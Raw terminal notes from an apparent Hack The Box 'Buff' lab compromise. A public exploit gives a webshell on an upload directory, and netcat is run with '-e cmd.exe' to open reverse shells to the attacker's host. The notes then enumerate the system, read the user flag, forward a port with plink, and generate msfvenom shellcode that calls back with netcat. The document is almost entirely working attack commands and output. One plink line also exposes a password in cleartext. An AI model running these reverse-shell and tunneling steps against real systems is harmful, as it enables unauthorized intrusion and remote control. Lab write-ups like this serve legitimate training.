root@Blue3:.../buff# py2 48506.py http://buff.htb:8080/
            /\
/vvvvvvvvvvvv \--------------------------------------,
`^^^^^^^^^^^^ /============BOKU====================="
            \/

[+] Successfully connected to webshell.
C:\xampp\htdocs\gym\upload> whoami


#
  ---------- ---------- ---------- ---------- ---------- ---------- ---------- ---------- ---------- ----------
  ---------- ---------- ---------- ----------         NEXT          ---------- ---------- ---------- ----------
  ---------- ---------- ---------- ---------- ---------- ---------- ---------- ---------- ---------- ----------
#

Get the nc:
C:\xampp\htdocs\gym\upload> cp /usr/share/windows-binaries/nc.exe .
�PNG
�

[Shell]: C:\xampp\htdocs\gym\upload> nc.exe 10.10.16.9 1337 -e cmd.exe
[Web]: http://buff.htb:8080/upload/kamehameha.php?telepathy= nc 10.10.16.9 1337 -e cmd.exe
[Web-Encoded]: http://buff.htb:8080/upload/kamehameha.php?telepathy=%20nc%2010.10.16.9%201337%20-e%20cmd.exe

=>
root@Blue3:~# nc -lvnp 1337
listening on [any] 1337 ...
connect to [10.10.16.9] from (UNKNOWN) [10.10.10.198] 50106
Microsoft Windows [Version 10.0.17134.1610]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\xampp\htdocs\gym\upload>whoami
whoami
buff\shaun

C:\xampp\htdocs\gym\upload>cd C:\users\shaun\Desktop
C:\Users\shaun>dir .
dir Desktop
 Volume in drive C has no label.
 Volume Serial Number is A22D-49F7

 Directory of C:\Users\shaun\Desktop

14/07/2020  13:27    <DIR>          .
14/07/2020  13:27    <DIR>          ..
31/08/2020  08:04                34 user.txt
               1 File(s)             34 bytes
               2 Dir(s)   9,763,217,408 bytes free

C:\Users\shaun\Desktop>type user.txt
type user.txt
********************************

C:\Users\shaun>cd ..\Downloads
C:\Users\shaun\Downloads>dir
 Volume in drive C has no label.
 Volume Serial Number is A22D-49F7

 Directory of C:\Users\shaun\Downloads

31/08/2020  11:47    <DIR>          .
31/08/2020  11:47    <DIR>          ..
16/06/2020  16:26        17,830,824 CloudMe_1112.exe
31/08/2020  11:47           311,296 plink.exe
               2 File(s)     18,142,120 bytes
               2 Dir(s)   9,763,323,904 bytes free

C:\Users\shaun\Downloads>systeminfo
systeminfo

Host Name:                 BUFF
OS Name:                   Microsoft Windows 10 Enterprise
OS Version:                10.0.17134 N/A Build 17134
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Workstation
OS Build Type:             Multiprocessor Free
Registered Owner:          shaun
Registered Organization:
Product ID:                00329-10280-00000-AA218
Original Install Date:     16/06/2020, 15:05:58
System Boot Time:          31/08/2020, 07:58:31
System Manufacturer:       VMware, Inc.
System Model:              VMware7,1
System Type:               x64-based PC
Processor(s):              2 Processor(s) Installed.
                           [01]: AMD64 Family 23 Model 49 Stepping 0 AuthenticAMD ~2994 Mhz
                           [02]: AMD64 Family 23 Model 49 Stepping 0 AuthenticAMD ~2994 Mhz
BIOS Version:              VMware, Inc. VMW71.00V.13989454.B64.1906190538, 19/06/2019
Windows Directory:         C:\Windows
System Directory:          C:\Windows\system32
Boot Device:               \Device\HarddiskVolume2
System Locale:             en-us;English (United States)
Input Locale:              en-gb;English (United Kingdom)
Time Zone:                 (UTC+00:00) Dublin, Edinburgh, Lisbon, London
Total Physical Memory:     4,095 MB
Available Physical Memory: 2,503 MB
Virtual Memory: Max Size:  4,799 MB
Virtual Memory: Available: 2,433 MB
Virtual Memory: In Use:    2,366 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    WORKGROUP
Logon Server:              N/A
Hotfix(s):                 N/A
Network Card(s):           1 NIC(s) Installed.
                           [01]: vmxnet3 Ethernet Adapter
                                 Connection Name: Ethernet0
                                 DHCP Enabled:    No
                                 IP address(es)
                                 [01]: 10.10.10.198
                                 [02]: fe80::548b:e558:eca6:7ac8
                                 [03]: dead:beef::c98a:711c:df4a:e874
                                 [04]: dead:beef::548b:e558:eca6:7ac8
Hyper-V Requirements:      A hypervisor has been detected. Features required for Hyper-V will not be displayed.


C:\xampp\htdocs\gym\upload>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is A22D-49F7

 Directory of C:\xampp\htdocs\gym\upload

31/08/2020  22:05    <DIR>          .
31/08/2020  22:05    <DIR>          ..
31/08/2020  22:05                53 kamehameha.php
31/08/2020  11:11            59,392 nc.exe
31/08/2020  15:33           598,440 pink.exe
31/08/2020  13:21           472,064 win.exe
               4 File(s)      1,129,949 bytes
               2 Dir(s)   9,768,775,680 bytes free

C:\xampp\htdocs\gym\upload>pink -l root -pw ******** 10.10.16.9 -R 8888:127.0.0.1:8888
pink -l root -pw 138@Blue 10.10.16.9 -R 8888:127.0.0.1:8888
The server's host key is not cached in the registry. You
have no guarantee that the server is the computer you
think it is.
The server's ssh-ed25519 key fingerprint is:
ssh-ed25519 255 d2:1e:d5:f1:66:84:88:7f:db:99:cb:4b:dc:29:ed:02
If you trust this host, enter "y" to add the key to
PuTTY's cache and carry on connecting.
If you want to carry on connecting just once, without
adding the key to the cache, enter "n".
If you do not trust this host, press Return to abandon the
connection.
Store key in cache? (y/n) y

root@Blue3:~# msfvenom -p windows/exec CMD='C:\xampp\htdocs\gym\upload\nc.exe -e cmd.exe 10.10.16.9 3592' -b '\x00\x0a\x0d' -f py -v payload
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
Found 11 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 272 (iteration=0)
x86/shikata_ga_nai chosen with final size 272
Payload size: 272 bytes
Final size of py file: 1448 bytes
payload =  b""
payload += b"\xbe\xdf\xa7\x94\x31\xdb\xce\xd9\x74\x24\xf4\x58"
payload += b"\x33\xc9\xb1\x3e\x83\xe8\xfc\x31\x70\x0f\x03\x70"
payload += b"\xd0\x45\x61\xcd\x06\x0b\x8a\x2e\xd6\x6c\x02\xcb"
payload += b"\xe7\xac\x70\x9f\x57\x1d\xf2\xcd\x5b\xd6\x56\xe6"
payload += b"\xe8\x9a\x7e\x09\x59\x10\x59\x24\x5a\x09\x99\x27"
payload += b"\xd8\x50\xce\x87\xe1\x9a\x03\xc9\x26\xc6\xee\x9b"
payload += b"\xff\x8c\x5d\x0c\x74\xd8\x5d\xa7\xc6\xcc\xe5\x54"
payload += b"\x9e\xef\xc4\xca\x95\xa9\xc6\xed\x7a\xc2\x4e\xf6"
payload += b"\x9f\xef\x19\x8d\x6b\x9b\x9b\x47\xa2\x64\x37\xa6"
payload += b"\x0b\x97\x49\xee\xab\x48\x3c\x06\xc8\xf5\x47\xdd"
payload += b"\xb3\x21\xcd\xc6\x13\xa1\x75\x23\xa2\x66\xe3\xa0"
payload += b"\xa8\xc3\x67\xee\xac\xd2\xa4\x84\xc8\x5f\x4b\x4b"
payload += b"\x59\x1b\x68\x4f\x02\xff\x11\xd6\xee\xae\x2e\x08"
payload += b"\x51\x0e\x8b\x42\x7f\x5b\xa6\x08\x15\x9a\x34\x37"
payload += b"\x5b\x9c\x46\x38\xcb\xf5\x77\xb3\x84\x82\x87\x16"
payload += b"\xe1\x7d\xc2\x3b\x43\x16\x8b\xa9\xd6\x7b\x2c\x04"
payload += b"\x14\x82\xaf\xad\xe4\x71\xaf\xc7\xe1\x3e\x77\x3b"
payload += b"\x9b\x2f\x12\x3b\x08\x4f\x37\x78\x94\xf3\xc0\x1e"
payload += b"\x85\x7b\x41\xbd\x3d\x08\xc5\x52\xde\x83\x59\xca"
payload += b"\x59\x09\x3e\x61\xe9\xbd\xd1\xe8\x6d\x62\x40\x88"
payload += b"\x43\xff\xe4\x2b\xbb\xd2\x71\x94\xd8\x41\x1e\xfa"
payload += b"\x7b\xe2\xbb\x22\xb2\x22\x6a\x12\x84\x6c\x43\x62"
payload += b"\xca\x49\x83\xb9\x27\x93\xf1\xbd"
